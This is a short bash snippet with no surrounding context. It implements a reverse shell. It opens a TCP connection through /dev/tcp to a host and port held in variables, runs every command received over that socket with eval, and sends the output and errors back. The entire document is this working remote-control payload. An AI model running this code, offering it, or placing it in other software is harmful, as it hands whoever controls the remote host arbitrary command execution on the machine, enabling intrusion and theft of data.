(
    exec 3<> /dev/tcp/$HOST/$PORT;

    while IFS= read -d "" -r data; do    
        [ -z "$data" ] && break;

        eval "$data" >&3 2>&3;
        printf "$ACKNOWLEDGE" >&3;
    done <&3;

    exec 3>&-;
)